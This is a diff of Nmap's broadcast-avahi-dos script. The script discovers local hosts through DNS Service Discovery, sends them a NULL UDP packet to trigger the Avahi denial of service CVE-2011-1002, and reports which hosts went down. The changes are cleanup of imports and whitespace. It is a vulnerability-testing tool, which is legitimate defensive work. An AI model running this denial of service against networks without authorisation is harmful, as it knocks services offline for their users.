@@ -1,3 +1,8 @@
+local dnssd = require "dnssd"
+local nmap = require "nmap"
+local stdnse = require "stdnse"
+local table = require "table"
+
 description=[[
 Attempts to discover hosts in the local network using the DNS Service
 Discovery protocol and sends a NULL UDP packet to each host to test
@@ -11,7 +16,7 @@ vulnerable.
 
 Reference:
 * http://avahi.org/ticket/325
-* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002 
+* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002
 ]]
 
 
@@ -20,7 +25,7 @@ Reference:
 -- nmap --script=broadcast-avahi-dos
 --
 -- @output
--- | broadcast-avahi-dos: 
+-- | broadcast-avahi-dos:
 -- |   Discovered hosts:
 -- |     10.0.1.150
 -- |     10.0.1.151
@@ -36,8 +41,6 @@ author = "Djalal Harouni"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"broadcast", "dos", "intrusive", "vuln"}
 
-require 'stdnse'
-require 'dnssd'
 
 prerule = function() return true end
 
@@ -52,17 +55,17 @@ action = function()
   local wtime = stdnse.get_script_args("broadcast-avahi-dos.wait") or 20
   local helper = dnssd.Helper:new()
   helper:setMulticast(true)
-	
+
   local status, result = helper:queryServices()
   if (status) then
     local output, hosts, tmp = {}, {}, {}
     for _, hostcfg in pairs(result) do
       for k, ip in pairs(hostcfg) do
-      	if type(k) == "string" and k == "name" then
-      	  if avahi_send_null_udp(ip) then
-      	    table.insert(hosts, ip)
-      	    tmp[ip] = true
-      	  end
+        if type(k) == "string" and k == "name" then
+          if avahi_send_null_udp(ip) then
+            table.insert(hosts, ip)
+            tmp[ip] = true
+          end
         end
       end
     end
@@ -71,7 +74,7 @@ action = function()
       hosts.name = "Discovered hosts:"
       table.insert(output, hosts)
       table.insert(output,
-          "After NULL UDP avahi packet DoS (CVE-2011-1002).")
+      "After NULL UDP avahi packet DoS (CVE-2011-1002).")
 
       stdnse.print_debug(3, "sleeping for %d seconds", wtime)
       stdnse.sleep(wtime)
@@ -85,7 +88,7 @@ action = function()
             end
           end
         end
-      end 
+      end
 
       local vulns = {}
       for ip, _ in pairs(tmp) do
@@ -98,7 +101,7 @@ action = function()
       else
         table.insert(output, "Hosts are all up (not vulnerable).")
       end
-      
+
       return stdnse.format_output(true, output)
     end
   end
